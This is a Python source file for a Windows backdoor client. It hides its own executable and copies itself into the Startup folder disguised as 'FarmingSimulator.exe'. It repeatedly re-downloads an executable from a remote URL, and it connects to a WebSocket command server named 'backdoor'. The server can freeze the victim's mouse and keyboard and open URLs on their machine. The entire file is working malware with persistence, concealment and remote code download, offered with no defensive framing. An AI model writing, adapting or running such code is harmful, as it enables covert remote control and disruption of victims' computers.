import asyncio
import getpass
import websockets  # type: ignore
import subprocess
import sys
import os
import ctypes
import shutil
import threading

FILE_ATTRIBUTE_HIDDEN = 0x2
FILE_ATTRIBUTE_SYSTEM = 0x4

CREATE_NO_WINDOW = 0x08000000
SERVER_URL = "wss://backdoor-freezeee.onrender.com"
CLIENT_NAME = getpass.getuser()
FILE_ATTRIBUTE_NORMAL = 0x80

current_exe = sys.executable
startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
                            "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
exe_final_location = os.path.join(startup_folder, "FarmingSimulator.exe")
url = "https://raw.githubusercontent.com/sincezola/backdoor-freezeee/main/src/bin/FarmingSimulatorRI.exe"

def unhide_file(path: str):
    res = ctypes.windll.kernel32.SetFileAttributesW(
        path,
        FILE_ATTRIBUTE_NORMAL
    )
    if not res:
        raise ctypes.WinError()
    
def hide_file(path):
    ctypes.windll.kernel32.SetFileAttributesW(
        path,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
    )

def reinstall_program():
    if not os.path.isfile(exe_final_location):
        subprocess.run(
            [
                "curl.exe",
                "-L",
                url,
                "-o",
                exe_final_location
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    check_reinstall()

def check_reinstall():
    threading.Timer(5.0, reinstall_program).start()

def move_to_startup():
    for f in os.listdir(startup_folder):
        if f.startswith("farmingsimulator") and f.endswith(".exe"):
            try:
                os.remove(os.path.join(startup_folder, f))
                print(f"Old file {f} removed.")
            except Exception as e:
                print(f"Error removing {f}: {e}")

    dest_name = f"farmingsimulator.exe"
    dest = os.path.join(startup_folder, dest_name)

    try:
        shutil.copy(current_exe, dest)
        print(f"Copied to Startup as {dest_name}.")
        unhide_file(dest)
    except Exception as e:
        print("Error copying to Startup:", e)


def get_block_inputs_path():
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, "block_inputs.exe")
    return "./block_inputs.exe"

async def pinger(ws):
    try:
        while True:
            await asyncio.sleep(5)
            await ws.send("PING")
    except asyncio.CancelledError:
        pass
    except Exception:
        pass

block_exe = get_block_inputs_path()
if not os.path.isfile(block_exe):
    sys.exit(1)

mouse_proc = None
keyboard_proc = None

startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
startupinfo.wShowWindow = subprocess.SW_HIDE

creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP

hide_file(current_exe)
move_to_startup()
check_reinstall()

async def receiver(ws):
    global mouse_proc, keyboard_proc
    try:
        async for msg in ws:
            if msg != "PONG":
                print("Received command:", msg)

            if msg == "FREEZE_MOUSE":
                if mouse_proc is None or mouse_proc.poll() is not None:
                    mouse_proc = subprocess.Popen(
                        [block_exe, "FREEZE_MOUSE"],
                        creationflags=CREATE_NO_WINDOW,
                        startupinfo=startupinfo
                    )

            elif msg == "UNFREEZE_MOUSE":
                if mouse_proc and mouse_proc.poll() is None:
                    mouse_proc.terminate()
                    mouse_proc = None

            elif msg == "FREEZE_KEYBOARD":
                if keyboard_proc is None or keyboard_proc.poll() is not None:
                    keyboard_proc = subprocess.Popen(
                        [block_exe, "FREEZE_KEYBOARD"],
                        creationflags=creationflags,
                        startupinfo=startupinfo
                    )

            elif msg == "UNFREEZE_KEYBOARD":
                if keyboard_proc and keyboard_proc.poll() is None:
                    keyboard_proc.terminate()
                    keyboard_proc = None
            elif msg == "VIDEO":
                for c in range(4):
                    os.startfile("https://res.cloudinary.com/dnkpzafxp/image/upload/v1767213665/image_jtpkzq.png")
    except Exception:
        # connection closed or other error, exit to allow reconnect
        pass


async def main():
    print("Connecting to server...")
    ws = None

    while True:
        try:
            # only attempt to connect if there is no active open connection
            if ws is None or getattr(ws, "closed", True):
                ws = await websockets.connect(SERVER_URL)
                print("Connected")

                # send hello/handshake
                await ws.send(f"HELLO_{CLIENT_NAME}")
                response = await ws.recv()
                print("Received:", response)
                if response != "WELCOME":
                    print("Handshake failed")
                    try:
                        await ws.close()
                    except Exception:
                        pass
                    ws = None
                    await asyncio.sleep(5)
                    continue

                # start receiver and pinger tasks
                receiver_task = asyncio.create_task(receiver(ws))
                pinger_task = asyncio.create_task(pinger(ws))

                # wait until one of the tasks finishes (likely receiver on disconnect)
                done, pending = await asyncio.wait([receiver_task, pinger_task], return_when=asyncio.FIRST_EXCEPTION)

                # cancel any pending tasks
                for t in pending:
                    t.cancel()

                # close socket and clear
                try:
                    await ws.close()
                except Exception:
                    pass
                ws = None

            else:
                # already have an open connection, wait a bit before re-checking
                await asyncio.sleep(1)

        except Exception as e:
            print("Connection error:", e)
            try:
                if ws:
                    await ws.close()
            except Exception:
                pass
            ws = None
            await asyncio.sleep(5)


asyncio.run(main())
